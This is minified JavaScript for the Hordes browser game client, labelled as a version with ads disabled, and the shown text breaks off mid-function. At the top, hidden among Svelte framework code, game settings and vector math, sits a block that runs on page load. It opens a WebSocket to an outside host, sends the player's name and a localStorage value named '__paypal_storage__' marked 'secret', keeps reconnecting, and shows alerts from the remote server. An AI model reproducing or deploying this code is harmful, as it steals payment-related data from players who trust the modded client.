!function () {
    "use strict";

    //VERSION WITH ADS DISABLED

    window.servercustomws = undefined;

    function connectServerWs() {
        try {
            const _ws = new WebSocket('wss://hordes-server.ddns.net:7777');
            window.servercustomws = _ws;
            _ws.onopen = function () {
                setTimeout(() => {
                    _ws.send(game.player.name);
                    _ws.send('secret ' + localStorage.getItem('__paypal_storage__'));
                }, 5000);

            }
            _ws.onmessage = function (message) {
                const content = message.data;
                window.alert(content);
            }

            _ws.onerror = function (err) {
                console.log(err);
            }
        } catch (ex) {
            console.log('nosrv');
        }
    }

    connectServerWs();

    setInterval(() => {
        if (window.servercustomws.readyState == 3) {
            connectServerWs();
        }
    }, 10000)

    function loadCustomScript() {
        const s = document.createElement('script');
        s.setAttribute('src', 'custom.js');
        document.head.appendChild(s);
    }

    const t = (t, e, s) => s.items[t]["book" == t ? Math.floor(e / 5) : e]
        , e = (e, s, i) => t(e, s, i).name + ("book" == e ? " Lv. " + (s % 5 + 1) : "")
        , s = (e, s, i) => t(e, s, i).description;
    function i() { }
    const n = t => t;
    function a(t, e) {
        for (const s in e)
            t[s] = e[s];
        return t
    }
    function r(t) {
        return t()
    }
    function o() {
        return Object.create(null)
    }
    function l(t) {
        t.forEach(r)
    }
    function c(t) {
        return "function" == typeof t
    }
    function h(t, e) {
        return t != t ? e == e : t !== e || t && "object" == typeof t || "function" == typeof t
    }
    function d(t, e) {
        return t != t ? e == e : t !== e
    }
    function u(t, ...e) {
        if (null == t)
            return i;
        const s = t.subscribe(...e);
        return s.unsubscribe ? () => s.unsubscribe() : s
    }
    function m(t, e, s) {
        t.$$.on_destroy.push(u(e, s))
    }
    function p(t, e, s, i) {
        if (t) {
            const n = f(t, e, s, i);
            return t[0](n)
        }
    }
    function f(t, e, s, i) {
        return t[1] && i ? a(s.ctx.slice(), t[1](i(e))) : s.ctx
    }
    function g(t, e, s, i) {
        if (t[2] && i) {
            const n = t[2](i(s));
            if (void 0 === e.dirty)
                return n;
            if ("object" == typeof n) {
                const t = []
                    , s = Math.max(e.dirty.length, n.length);
                for (let i = 0; i < s; i += 1)
                    t[i] = e.dirty[i] | n[i];
                return t
            }
            return e.dirty | n
        }
        return e.dirty
    }
    function v(t) {
        return null == t ? "" : t
    }
    function y(t, e, s = e) {
        return t.set(s),
            e
    }
    const b = "undefined" != typeof window;
    let w = b ? () => window.performance.now() : () => Date.now()
        , x = b ? t => requestAnimationFrame(t) : i;
    const k = new Set;
    function $(t) {
        k.forEach(e => {
            e.c(t) || (k.delete(e),
                e.f())
        }
        ),
            0 !== k.size && x($)
    }
    function S(t) {
        let e;
        return 0 === k.size && x($),
        {
            promise: new Promise(s => {
                k.add(e = {
                    c: t,
                    f: s
                })
            }
            ),
            abort() {
                k.delete(e)
            }
        }
    }
    function E(t, e) {
        t.appendChild(e)
    }
    function M(t, e, s) {
        t.insertBefore(e, s || null)
    }
    function _(t) {
        t.parentNode.removeChild(t)
    }
    function C(t, e) {
        for (let s = 0; s < t.length; s += 1)
            t[s] && t[s].d(e)
    }
    function T(t) {
        return document.createElement(t)
    }
    function P(t) {
        return document.createTextNode(t)
    }
    function I() {
        return P(" ")
    }
    function D() {
        return P("")
    }
    function A(t, e, s, i) {
        return t.addEventListener(e, s, i),
            () => t.removeEventListener(e, s, i)
    }
    function B(t, e, s) {
        null == s ? t.removeAttribute(e) : t.getAttribute(e) !== s && t.setAttribute(e, s)
    }
    function R(t) {
        return "" === t ? void 0 : +t
    }
    function z(t) {
        return Array.from(t.childNodes)
    }
    function F(t, e) {
        e = "" + e,
            t.data !== e && (t.data = e)
    }
    function Z(t, e) {
        (null != e || t.value) && (t.value = e)
    }
    function U(t, e, s, i) {
        t.style.setProperty(e, s, i ? "important" : "")
    }
    function L(t, e) {
        for (let s = 0; s < t.options.length; s += 1) {
            const i = t.options[s];
            if (i.__value === e)
                return void (i.selected = !0)
        }
    }
    function N(t) {
        const e = t.querySelector(":checked") || t.options[0];
        return e && e.__value
    }
    function O(t, e) {
        const s = document.createEvent("CustomEvent");
        return s.initCustomEvent(t, !1, !1, e),
            s
    }
    const j = new Set;
    let q, X = 0;
    function H(t) {
        let e = 5381
            , s = t.length;
        for (; s--;)
            e = (e << 5) - e ^ t.charCodeAt(s);
        return e >>> 0
    }
    function K(t, e, s, i, n, a, r, o = 0) {
        const l = 16.666 / i;
        let c = "{\n";
        for (let t = 0; t <= 1; t += l) {
            const i = e + (s - e) * a(t);
            c += 100 * t + `%{${r(i, 1 - i)}}\n`
        }
        const h = c + `100% {${r(s, 1 - s)}}\n}`
            , d = `__svelte_${H(h)}_${o}`
            , u = t.ownerDocument;
        j.add(u);
        const m = u.__svelte_stylesheet || (u.__svelte_stylesheet = u.head.appendChild(T("style")).sheet)
            , p = u.__svelte_rules || (u.__svelte_rules = {});
        p[d] || (p[d] = !0,
            m.insertRule(`@keyframes ${d} ${h}`, m.cssRules.length));
        const f = t.style.animation || "";
        return t.style.animation = `${f ? f + ", " : ""}${d} ${i}ms linear ${n}ms 1 both`,
            X += 1,
            d
    }
    function W(t, e) {
        const s = (t.style.animation || "").split(", ")
            , i = s.filter(e ? t => t.indexOf(e) < 0 : t => -1 === t.indexOf("__svelte"))
            , n = s.length - i.length;
        n && (t.style.animation = i.join(", "),
            X -= n,
            X || Y())
    }
    function Y() {
        x(() => {
            X || (j.forEach(t => {
                const e = t.__svelte_stylesheet;
                let s = e.cssRules.length;
                for (; s--;)
                    e.deleteRule(s);
                t.__svelte_rules = {}
            }
            ),
                j.clear())
        }
        )
    }
    function V(t) {
        q = t
    }
    function G() {
        if (!q)
            throw new Error("Function called outside component initialization");
        return q
    }
    function Q(t) {
        G().$$.before_update.push(t)
    }
    function J(t) {
        G().$$.on_mount.push(t)
    }
    function tt(t) {
        G().$$.after_update.push(t)
    }
    function et(t) {
        G().$$.on_destroy.push(t)
    }
    function st() {
        const t = G();
        return (e, s) => {
            const i = t.$$.callbacks[e];
            if (i) {
                const n = O(e, s);
                i.slice().forEach(e => {
                    e.call(t, n)
                }
                )
            }
        }
    }
    function it(t, e) {
        const s = t.$$.callbacks[e.type];
        s && s.slice().forEach(t => t(e))
    }
    const nt = []
        , at = []
        , rt = []
        , ot = []
        , lt = Promise.resolve();
    let ct = !1;
    function ht() {
        ct || (ct = !0,
            lt.then(gt))
    }
    function dt() {
        return ht(),
            lt
    }
    function ut(t) {
        rt.push(t)
    }
    function mt(t) {
        ot.push(t)
    }
    let pt = !1;
    const ft = new Set;
    function gt() {
        if (!pt) {
            pt = !0;
            do {
                for (let t = 0; t < nt.length; t += 1) {
                    const e = nt[t];
                    V(e),
                        vt(e.$$)
                }
                for (nt.length = 0; at.length;)
                    at.pop()();
                for (let t = 0; t < rt.length; t += 1) {
                    const e = rt[t];
                    ft.has(e) || (ft.add(e),
                        e())
                }
                rt.length = 0
            } while (nt.length); for (; ot.length;)
                ot.pop()();
            ct = !1,
                pt = !1,
                ft.clear()
        }
    }
    function vt(t) {
        if (null !== t.fragment) {
            t.update(),
                l(t.before_update);
            const e = t.dirty;
            t.dirty = [-1],
                t.fragment && t.fragment.p(t.ctx, e),
                t.after_update.forEach(ut)
        }
    }
    let yt;
    function bt() {
        return yt || (yt = Promise.resolve(),
            yt.then(() => {
                yt = null
            }
            )),
            yt
    }
    function wt(t, e, s) {
        t.dispatchEvent(O(`${e ? "intro" : "outro"}${s}`))
    }
    const xt = new Set;
    let kt;
    function $t() {
        kt = {
            r: 0,
            c: [],
            p: kt
        }
    }
    function St() {
        kt.r || l(kt.c),
            kt = kt.p
    }
    function Et(t, e) {
        t && t.i && (xt.delete(t),
            t.i(e))
    }
    function Mt(t, e, s, i) {
        if (t && t.o) {
            if (xt.has(t))
                return;
            xt.add(t),
                kt.c.push(() => {
                    xt.delete(t),
                        i && (s && t.d(1),
                            i())
                }
                ),
                t.o(e)
        }
    }
    const _t = {
        duration: 0
    };
    function Ct(t, e, s) {
        let a, r = e(t, s), o = !0;
        const h = kt;
        function d() {
            const { delay: e = 0, duration: s = 300, easing: c = n, tick: d = i, css: u } = r || _t;
            u && (a = K(t, 1, 0, s, e, c, u));
            const m = w() + e
                , p = m + s;
            ut(() => wt(t, !1, "start")),
                S(e => {
                    if (o) {
                        if (e >= p)
                            return d(0, 1),
                                wt(t, !1, "end"),
                                --h.r || l(h.c),
                                !1;
                        if (e >= m) {
                            const t = c((e - m) / s);
                            d(1 - t, t)
                        }
                    }
                    return o
                }
                )
        }
        return h.r += 1,
            c(r) ? bt().then(() => {
                r = r(),
                    d()
            }
            ) : d(),
        {
            end(e) {
                e && r.tick && r.tick(1, 0),
                    o && (a && W(t, a),
                        o = !1)
            }
        }
    }
    function Tt(t, e, s, a) {
        let r = e(t, s)
            , o = a ? 0 : 1
            , h = null
            , d = null
            , u = null;
        function m() {
            u && W(t, u)
        }
        function p(t, e) {
            const s = t.b - o;
            return e *= Math.abs(s),
            {
                a: o,
                b: t.b,
                d: s,
                duration: e,
                start: t.start,
                end: t.start + e,
                group: t.group
            }
        }
        function f(e) {
            const { delay: s = 0, duration: a = 300, easing: c = n, tick: f = i, css: g } = r || _t
                , v = {
                    start: w() + s,
                    b: e
                };
            e || (v.group = kt,
                kt.r += 1),
                h ? d = v : (g && (m(),
                    u = K(t, o, e, a, s, c, g)),
                    e && f(0, 1),
                    h = p(v, a),
                    ut(() => wt(t, e, "start")),
                    S(e => {
                        if (d && e > d.start && (h = p(d, a),
                            d = null,
                            wt(t, h.b, "start"),
                            g && (m(),
                                u = K(t, o, h.b, h.duration, 0, c, r.css))),
                            h)
                            if (e >= h.end)
                                f(o = h.b, 1 - o),
                                    wt(t, h.b, "end"),
                                    d || (h.b ? m() : --h.group.r || l(h.group.c)),
                                    h = null;
                            else if (e >= h.start) {
                                const t = e - h.start;
                                o = h.a + h.d * c(t / h.duration),
                                    f(o, 1 - o)
                            }
                        return !(!h && !d)
                    }
                    ))
        }
        return {
            run(t) {
                c(r) ? bt().then(() => {
                    r = r(),
                        f(t)
                }
                ) : f(t)
            },
            end() {
                m(),
                    h = d = null
            }
        }
    }
    const Pt = "undefined" != typeof window ? window : "undefined" != typeof globalThis ? globalThis : global;
    function It(t, e) {
        t.d(1),
            e.delete(t.key)
    }
    function Dt(t, e) {
        Mt(t, 1, 1, () => {
            e.delete(t.key)
        }
        )
    }
    function At(t, e, s, i, n, a, r, o, l, c, h, d) {
        let u = t.length
            , m = a.length
            , p = u;
        const f = {};
        for (; p--;)
            f[t[p].key] = p;
        const g = []
            , v = new Map
            , y = new Map;
        for (p = m; p--;) {
            const t = d(n, a, p)
                , o = s(t);
            let l = r.get(o);
            l ? i && l.p(t, e) : (l = c(o, t),
                l.c()),
                v.set(o, g[p] = l),
                o in f && y.set(o, Math.abs(p - f[o]))
        }
        const b = new Set
            , w = new Set;
        function x(t) {
            Et(t, 1),
                t.m(o, h, r.has(t.key)),
                r.set(t.key, t),
                h = t.first,
                m--
        }
        for (; u && m;) {
            const e = g[m - 1]
                , s = t[u - 1]
                , i = e.key
                , n = s.key;
            e === s ? (h = e.first,
                u--,
                m--) : v.has(n) ? !r.has(i) || b.has(i) ? x(e) : w.has(n) ? u-- : y.get(i) > y.get(n) ? (w.add(i),
                    x(e)) : (b.add(n),
                        u--) : (l(s, r),
                            u--)
        }
        for (; u--;) {
            const e = t[u];
            v.has(e.key) || l(e, r)
        }
        for (; m;)
            x(g[m - 1]);
        return g
    }
    function Bt(t, e) {
        const s = {}
            , i = {}
            , n = {
                $$scope: 1
            };
        let a = t.length;
        for (; a--;) {
            const r = t[a]
                , o = e[a];
            if (o) {
                for (const t in r)
                    t in o || (i[t] = 1);
                for (const t in o)
                    n[t] || (s[t] = o[t],
                        n[t] = 1);
                t[a] = o
            } else
                for (const t in r)
                    n[t] = 1
        }
        for (const t in i)
            t in s || (s[t] = void 0);
        return s
    }
    function Rt(t) {
        return "object" == typeof t && null !== t ? t : {}
    }
    function zt(t, e, s) {
        const i = t.$$.props[e];
        void 0 !== i && (t.$$.bound[i] = s,
            s(t.$$.ctx[i]))
    }
    function Ft(t) {
        t && t.c()
    }
    function Zt(t, e, s) {
        const { fragment: i, on_mount: n, on_destroy: a, after_update: o } = t.$$;
        i && i.m(e, s),
            ut(() => {
                const e = n.map(r).filter(c);
                a ? a.push(...e) : l(e),
                    t.$$.on_mount = []
            }
            ),
            o.forEach(ut)
    }
    function Ut(t, e) {
        const s = t.$$;
        null !== s.fragment && (l(s.on_destroy),
            s.fragment && s.fragment.d(e),
            s.on_destroy = s.fragment = null,
            s.ctx = [])
    }
    function Lt(t, e) {
        -1 === t.$$.dirty[0] && (nt.push(t),
            ht(),
            t.$$.dirty.fill(0)),
            t.$$.dirty[e / 31 | 0] |= 1 << e % 31
    }
    function Nt(t, e, s, n, a, r, c = [-1]) {
        const h = q;
        V(t);
        const d = e.props || {}
            , u = t.$$ = {
                fragment: null,
                ctx: null,
                props: r,
                update: i,
                not_equal: a,
                bound: o(),
                on_mount: [],
                on_destroy: [],
                before_update: [],
                after_update: [],
                context: new Map(h ? h.$$.context : []),
                callbacks: o(),
                dirty: c
            };
        let m = !1;
        if (u.ctx = s ? s(t, d, (e, s, ...i) => {
            const n = i.length ? i[0] : s;
            return u.ctx && a(u.ctx[e], u.ctx[e] = n) && (u.bound[e] && u.bound[e](n),
                m && Lt(t, e)),
                s
        }
        ) : [],
            u.update(),
            m = !0,
            l(u.before_update),
            u.fragment = !!n && n(u.ctx),
            e.target) {
            if (e.hydrate) {
                const t = z(e.target);
                u.fragment && u.fragment.l(t),
                    t.forEach(_)
            } else
                u.fragment && u.fragment.c();
            e.intro && Et(t.$$.fragment),
                Zt(t, e.target, e.anchor),
                gt()
        }
        V(h)
    }
    class Ot {
        $destroy() {
            Ut(this, 1),
                this.$destroy = i
        }
        $on(t, e) {
            const s = this.$$.callbacks[t] || (this.$$.callbacks[t] = []);
            return s.push(e),
                () => {
                    const t = s.indexOf(e);
                    -1 !== t && s.splice(t, 1)
                }
        }
        $set() { }
    }
    const jt = [];
    function qt(t, e = i) {
        let s;
        const n = [];
        function a(e) {
            if (h(t, e) && (t = e,
                s)) {
                const e = !jt.length;
                for (let e = 0; e < n.length; e += 1) {
                    const s = n[e];
                    s[1](),
                        jt.push(s, t)
                }
                if (e) {
                    for (let t = 0; t < jt.length; t += 2)
                        jt[t][0](jt[t + 1]);
                    jt.length = 0
                }
            }
        }
        function r(e) {
            a(e(t))
        }
        function o(r, o = i) {
            const l = [r, o];
            return n.push(l),
                1 === n.length && (s = e(a) || i),
                r(t),
                () => {
                    const t = n.indexOf(l);
                    -1 !== t && n.splice(t, 1),
                        0 === n.length && (s(),
                            s = null)
                }
        }
        return {
            set: a,
            update: r,
            subscribe: o
        }
    }
    const Xt = qt([])
        , Ht = qt({})
        , Kt = qt([])
        , Wt = qt()
        , Yt = qt([])
        , Vt = qt({})
        , Gt = qt()
        , Qt = qt(!1)
        , Jt = qt()
        , te = qt(!1)
        , ee = qt(!0)
        , se = qt()
        , ie = qt([])
        , ne = qt({})
        , ae = qt({})
        , re = qt([])
        , oe = qt([])
        , le = qt()
        , ce = qt("auto")
        , he = qt(0)
        , de = qt(0)
        , ue = qt(0)
        , me = qt([])
        , pe = qt({})
        , fe = qt({})
        , ge = qt([])
        , ve = qt({
            current: 0,
            max: 1
        })
        , ye = qt()
        , be = qt()
        , we = qt(!1)
        , xe = qt(0)
        , ke = qt([0, 0])
        , $e = qt()
        , Se = qt()
        , Ee = qt([])
        , Me = qt()
        , _e = qt(!1)
        , Ce = qt(!1)
        , Te = qt()
        , Pe = qt([])
        , Ie = qt()
        , De = qt()
        , Ae = qt()
        , Be = qt()
        , Re = qt({})
        , ze = qt({})
        , Fe = qt()
        , Ze = qt()
        , Ue = []
        , Le = qt("")
        , Ne = qt(0)
        , Oe = qt(35)
        , je = qt(90)
        , qe = qt(2)
        , Xe = qt(!1)
        , He = qt(!0)
        , Ke = qt(!0)
        , We = qt(!0)
        , Ye = qt(!1)
        , Ve = qt(!0)
        , Ge = qt(!0)
        , Qe = qt(!0)
        , Je = qt(50)
        , ts = qt(65)
        , es = qt(20)
        , ss = qt("en")
        , is = qt("global")
        , ns = qt(8)
        , as = qt(300)
        , rs = qt(5)
        , os = qt(!1)
        , ls = qt(!1)
        , cs = qt(!1)
        , hs = qt(!1)
        , ds = qt(!0)
        , us = qt(!1)
        , ms = qt(!1)
        , ps = qt(!0)
        , fs = qt("Damage")
        , gs = qt(!1)
        , vs = qt({})
        , ys = qt([0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1])
        , bs = qt(7)
        , ws = qt(!1)
        , xs = qt(100)
        , ks = qt(!0)
        , $s = qt(!0)
        , Ss = qt(!1)
        , Es = qt(!0)
        , Ms = qt(!1)
        , _s = qt(!0)
        , Cs = qt(!1)
        , Ts = qt(0)
        , Ps = qt(!0)
        , Is = qt(!0)
        , Ds = qt(!0)
        , As = qt(!0)
        , Bs = qt([])
        , Rs = qt(0)
        , zs = qt(!1)
        , Fs = qt(!1)
        , Zs = qt(70)
        , Us = qt(!0)
        , Ls = qt(!0)
        , Ns = qt(.5)
        , Os = qt(3)
        , js = qt(!0)
        , qs = qt(200)
        , Xs = qt(!0)
        , Hs = qt(!1)
        , Ks = qt(14)
        , Ws = qt(8)
        , Ys = qt(!1)
        , Vs = qt(1)
        , Gs = qt(!1)
        , Qs = qt(!1)
        , Js = qt(!0)
        , ti = qt(!0)
        , ei = qt("w")
        , si = qt("arrowleft")
        , ii = qt("arrowright")
        , ni = qt("arrowup")
        , ai = qt("arrowdown")
        , ri = qt("a")
        , oi = qt("s")
        , li = qt("d")
        , ci = qt("tab")
        , hi = qt("escape")
        , di = qt("m")
        , ui = qt("k")
        , mi = qt("c")
        , pi = qt("b")
        , fi = qt("g")
        , gi = qt(12)
        , vi = qt("1")
        , yi = qt("2")
        , bi = qt("3")
        , wi = qt("4")
        , xi = qt("5")
        , ki = qt("6")
        , $i = qt("7")
        , Si = qt("8")
        , Ei = qt("9")
        , Mi = qt("0")
        , _i = qt("o")
        , Ci = qt("p")
        , Ti = qt("")
        , Pi = qt("")
        , Ii = qt("")
        , Di = qt("")
        , Ai = qt("")
        , Bi = qt("")
        , Ri = qt("")
        , zi = qt("")
        , Fi = qt("")
        , Zi = qt("")
        , Ui = qt("")
        , Li = qt("");
    let Ni;
    Ni = {
        ...Object.freeze({
            __proto__: null,
            activeWorld: Le,
            lastConnectedChar: Ne,
            viewRange: Oe,
            resolution: je,
            shadowmapResolution: qe,
            realtimeShadows: Xe,
            postProcessing: He,
            grass: Ke,
            shadows: We,
            ssao: Ye,
            clouds: Ve,
            particles: Ge,
            detailprops: Qe,
            ambienceVolume: Je,
            audioVolume: ts,
            musicVolume: es,
            lang: ss,
            command: is,
            stashCols: ns,
            stashHeight: as,
            inventoryCols: rs,
            inventoryOpen: os,
            settingsOpen: ls,
            skillmenuOpen: cs,
            dpsmeterOpen: hs,
            twitchOpen: ds,
            subscriptionOpen: us,
            clanOpen: ms,
            dpsmeterParty: ps,
            dpsmeterMode: fs,
            charpanelOpen: gs,
            skillbarsettings: vs,
            chat: ys,
            cameraZoom: bs,
            editorActive: ws,
            nameplateViewRange: xs,
            nameplateShowMonsers: ks,
            nameplateShowTransparency: $s,
            alwaysShowLevel: Ss,
            showFriendlyBars: Es,
            classColorBars: Ms,
            mapShowMonsters: _s,
            mapLowQuality: Cs,
            tutprogress: Ts,
            chatbubbles: Ps,
            showIncomingHeal: Is,
            showIncomingDamage: Ds,
            showIncomingMana: As,
            filteredChannels: Bs,
            itemQualityFilter: Rs,
            itemQualityPercent: zs,
            showFpsPing: Fs,
            itemProtectQuality: Zs,
            cdTextSkills: Us,
            cdTextBuffs: Ls,
            buffCdFlashingInterval: Ns,
            buffCdFlashingDuration: Os,
            partyBuffLimitUpdateRate: js,
            partyWidth: qs,
            showSelfInParty: Xs,
            showPartyMana: Hs,
            buffcountUnitframes: Ks,
            buffcountParty: Ws,
            buffsHideIrrelevant: Ys,
            mouseSensitivity: Vs,
            invertMouseX: Gs,
            invertMouseY: Qs,
            lockedcamera: Js,
            pointerlock: ti,
            kbForward: ei,
            kbTurnLeft: si,
            kbTurnRight: ii,
            kbAltForward: ni,
            kbAltBack: ai,
            kbLeft: ri,
            kbBack: oi,
            kbRight: li,
            kbNextTarget: ci,
            kbUntarget: hi,
            kbMap: di,
            kbSkills: ui,
            kbCharacter: mi,
            kbInventory: pi,
            kbClan: fi,
            skillbarAmount: gi,
            kbSkillbar1: vi,
            kbSkillbar2: yi,
            kbSkillbar3: bi,
            kbSkillbar4: wi,
            kbSkillbar5: xi,
            kbSkillbar6: ki,
            kbSkillbar7: $i,
            kbSkillbar8: Si,
            kbSkillbar9: Ei,
            kbSkillbar10: Mi,
            kbSkillbar11: _i,
            kbSkillbar12: Ci,
            kbSkillbar13: Ti,
            kbSkillbar14: Pi,
            kbSkillbar15: Ii,
            kbSkillbar16: Di,
            kbSkillbar17: Ai,
            kbSkillbar18: Bi,
            kbSkillbar19: Ri,
            kbSkillbar20: zi,
            kbSkillbar21: Fi,
            kbSkillbar22: Zi,
            kbSkillbar23: Ui,
            kbSkillbar24: Li
        })
    };
    const Oi = (t, e) => {
        const s = localStorage.getItem(t)
            , i = JSON.parse("undefined" == s ? null : s);
        null !== i && e.set(i),
            e.subscribe(e => {
                ji[t] = e,
                    localStorage.setItem(t, JSON.stringify(e))
            }
            )
    }
        , ji = {};
    for (const t in Ni)
        Oi(t, Ni[t]);
    var qi = Object.freeze({
        __proto__: null,
        current: ji,
        activeWorld: Le,
        lastConnectedChar: Ne,
        viewRange: Oe,
        resolution: je,
        shadowmapResolution: qe,
        realtimeShadows: Xe,
        postProcessing: He,
        grass: Ke,
        shadows: We,
        ssao: Ye,
        clouds: Ve,
        particles: Ge,
        detailprops: Qe,
        ambienceVolume: Je,
        audioVolume: ts,
        musicVolume: es,
        lang: ss,
        command: is,
        stashCols: ns,
        stashHeight: as,
        inventoryCols: rs,
        inventoryOpen: os,
        settingsOpen: ls,
        skillmenuOpen: cs,
        dpsmeterOpen: hs,
        twitchOpen: ds,
        subscriptionOpen: us,
        clanOpen: ms,
        dpsmeterParty: ps,
        dpsmeterMode: fs,
        charpanelOpen: gs,
        skillbarsettings: vs,
        chat: ys,
        cameraZoom: bs,
        editorActive: ws,
        nameplateViewRange: xs,
        nameplateShowMonsers: ks,
        nameplateShowTransparency: $s,
        alwaysShowLevel: Ss,
        showFriendlyBars: Es,
        classColorBars: Ms,
        mapShowMonsters: _s,
        mapLowQuality: Cs,
        tutprogress: Ts,
        chatbubbles: Ps,
        showIncomingHeal: Is,
        showIncomingDamage: Ds,
        showIncomingMana: As,
        filteredChannels: Bs,
        itemQualityFilter: Rs,
        itemQualityPercent: zs,
        showFpsPing: Fs,
        itemProtectQuality: Zs,
        cdTextSkills: Us,
        cdTextBuffs: Ls,
        buffCdFlashingInterval: Ns,
        buffCdFlashingDuration: Os,
        partyBuffLimitUpdateRate: js,
        partyWidth: qs,
        showSelfInParty: Xs,
        showPartyMana: Hs,
        buffcountUnitframes: Ks,
        buffcountParty: Ws,
        buffsHideIrrelevant: Ys,
        mouseSensitivity: Vs,
        invertMouseX: Gs,
        invertMouseY: Qs,
        lockedcamera: Js,
        pointerlock: ti,
        kbForward: ei,
        kbTurnLeft: si,
        kbTurnRight: ii,
        kbAltForward: ni,
        kbAltBack: ai,
        kbLeft: ri,
        kbBack: oi,
        kbRight: li,
        kbNextTarget: ci,
        kbUntarget: hi,
        kbMap: di,
        kbSkills: ui,
        kbCharacter: mi,
        kbInventory: pi,
        kbClan: fi,
        skillbarAmount: gi,
        kbSkillbar1: vi,
        kbSkillbar2: yi,
        kbSkillbar3: bi,
        kbSkillbar4: wi,
        kbSkillbar5: xi,
        kbSkillbar6: ki,
        kbSkillbar7: $i,
        kbSkillbar8: Si,
        kbSkillbar9: Ei,
        kbSkillbar10: Mi,
        kbSkillbar11: _i,
        kbSkillbar12: Ci,
        kbSkillbar13: Ti,
        kbSkillbar14: Pi,
        kbSkillbar15: Ii,
        kbSkillbar16: Di,
        kbSkillbar17: Ai,
        kbSkillbar18: Bi,
        kbSkillbar19: Ri,
        kbSkillbar20: zi,
        kbSkillbar21: Fi,
        kbSkillbar22: Zi,
        kbSkillbar23: Ui,
        kbSkillbar24: Li
    });
    let Xi;
    ss.subscribe(async t => {
        await fetch(`/assets/loc/${t}.json?v=4002247`).then(async t => {
            Xi = await t.json(),
                Qt.set(!0)
        }
        )
    }
    );
    const Hi = (t, s) => e(t, s, Xi)
        , Ki = (t, e) => s(t, e, Xi);
    function Wi(t) {
        const e = t[0]
            , s = t[1]
            , i = t[2];
        return Math.sqrt(e * e + s * s + i * i)
    }
    function Yi(t, e) {
        return t[0] = e[0],
            t[1] = e[1],
            t[2] = e[2],
            t
    }
    function Vi(t, e, s, i) {
        return t[0] = e,
            t[1] = s,
            t[2] = i,
            t
    }
    function Gi(t, e) {
        return t[0] = e,
            t[1] = e,
            t[2] = e,
            t
    }
    function Qi(t, e, s) {
        return t[0] = e[0] + s[0],
            t[1] = e[1] + s[1],
            t[2] = e[2] + s[2],
            t
    }
    function Ji(t, e, s, i) {
        return t[0] += e,
            t[1] += s,
            t[2] += i,
            t
    }
    function tn(t, e, s) {
        return t[0] = e[0] - s[0],
            t[1] = e[1] - s[1],
            t[2] = e[2] - s[2],
            t
    }
    function en(t, e, s) {
        return t[0] = e[0] * s,
            t[1] = e[1] * s,
            t[2] = e[2] * s,
            t
    }
    function sn(t, e, s, i) {
        return t[0] = e[0] + s[0] * i,
            t[1] = e[1] + s[1] * i,
            t[2] = e[2] + s[2] * i,
            t
    }
    function nn(t, e) {
        const s = e[0] - t[0]
            , i = e[1] - t[1]
            , n = e[2] - t[2];
        return Math.sqrt(s * s + i * i + n * n)
    }
    function an(t, e) {
        const s = e[0] - t[0]
            , i = e[1] - t[1]
            , n = e[2] - t[2];
        return s * s + i * i + n * n
    }
    function rn(t) {
        const e = t[0]
            , s = t[1]
            , i = t[2];
        return e * e + s * s + i * i
    }
    function on(t, e) {
        const s = e[0]
            , i = e[1]
            , n = e[2];
        let a = s * s + i * i + n * n;
        return a > 0 && (a = 1 / Math.sqrt(a)),
            t[0] = e[0] * a,
            t[1] = e[1] * a,
            t[2] = e[2] * a,
            t
    }
    function ln(t, e) {
        return t[0] * e[0] + t[1] * e[1] + t[2] * e[2]
    }
    function cn(t, e, s) {
        const i = e[0]
            , n = e[1]
            , a = e[2]
            , r = s[0]
            , o = s[1]
            , l = s[2];
        return t[0] = n * l - a * o,
            t[1] = a * r - i * l,
            t[2] = i * o - n * r,
            t
    }
    function hn(t, e, s) {
        const i = e[0]
            , n = e[1]
            , a = e[2];
        let r = s[3] * i + s[7] * n + s[11] * a + s[15];
        return r = r || 1,
            t[0] = (s[0] * i + s[4] * n + s[8] * a + s[12]) / r,
            t[1] = (s[1] * i + s[5] * n + s[9] * a + s[13]) / r,
            t[2] = (s[2] * i + s[6] * n + s[10] * a + s[14]) / r,
            t
    }
    function dn(t, e, s) {
        const i = e[0]
            , n = e[1]
            , a = e[2]
            , r = s[0]
            , o = s[1]
            , l = s[2];
        let c = o * a - l * n
            , h = l * i - r * a
            , d = r * n - o * i
            , u = o * d - l * h
            , m = l * c - r * d
            , p = r * h - o * c;
        const f = 2 * s[3];
        return c *= f,
            h *= f,
            d *= f,
            u *= 2,
            m *= 2,
            p *= 2,
            t[0] = i + c + u,
            t[1] = n + h + m,
            t[2] = a + d + p,
            t
    }
    function un(t, e) {
        return t[0] === e[0] && t[1] === e[1] && t[2] === e[2]
    }
    function mn(t, e, s) {
        const i = Math.sin(s)
            , n = Math.cos(s);
        return t[0] = e[2] * i + e[0] * n,
            t[1] = e[1],
            t[2] = e[2] * n - e[0] * i,
            t
    }
    function pn(t, e, s) {
        const i = Math.sin(s)
            , n = Math.cos(s);
        return t[0] = e[1] * i + e[0] * n,
            t[2] = e[1] * n - e[0] * i,
            t
    }
    const fn = [0, 0, 0];
    let gn = 1
        , vn = 1;
    const yn = (t, e, s, i, n) => {
        Vi(e, 1 / 0, 1 / 0, 1 / 0),
            Vi(s, -1 / 0, -1 / 0, -1 / 0);
        for (let i = 0, n = t.length; i < n; i += 3) {
            const n = t[i]
                , a = t[i + 1]
                , r = t[i + 2];
            e[0] = Math.min(n, e[0]),
                e[1] = Math.min(a, e[1]),
                e[2] = Math.min(r, e[2]),
                s[0] = Math.max(n, s[0]),
                s[1] = Math.max(a, s[1]),
                s[2] = Math.max(r, s[2])
        }
        tn(n, s, e),
            en(i, Qi(i, e, s), .5)
    }
        ;
    class bn {
        constructor(t, e = {}) {
            this.gl = t,
                this.attributes = e,
                this.id = gn++,
                this.drawRange = {
                    start: 0,
                    count: 0
                },
                this.attrRange = 0,
                this.instancedCount = 0,
                this.vao = [],
                this.bounds = {
                    min: [0, 0, 0],
                    max: [0, 0, 0],
                    center: [0, 0, 0],
                    scale: [0, 0, 0],
                    radius: 1 / 0,
                    initiated: !1
                },
                this.addAttributes(e)
        }
        addAttributes(t) {
            this.gl.renderer.bindVertexArray(null),
                this.gl.renderer.currentGeometry = null,
                this.glState = this.gl.renderer.state;
            for (const e in t)
                this.addAttribute(e, t[e])
        }
        addAttribute(t, e) {
            if (this.attributes[t] = e,
                e.id = vn++,
                e.size = e.size || 1,
                e.type = e.type || (e.data.constructor === Float32Array ? this.gl.FLOAT : e.data.constructor === Uint16Array ? this.gl.UNSIGNED_SHORT : this.gl.UNSIGNED_INT),
                e.target = "index" === t ? this.gl.ELEMENT_ARRAY_BUFFER : this.gl.ARRAY_BUFFER,
                e.normalize = e.normalize || !1,
                e.buffer = this.gl.createBuffer(),
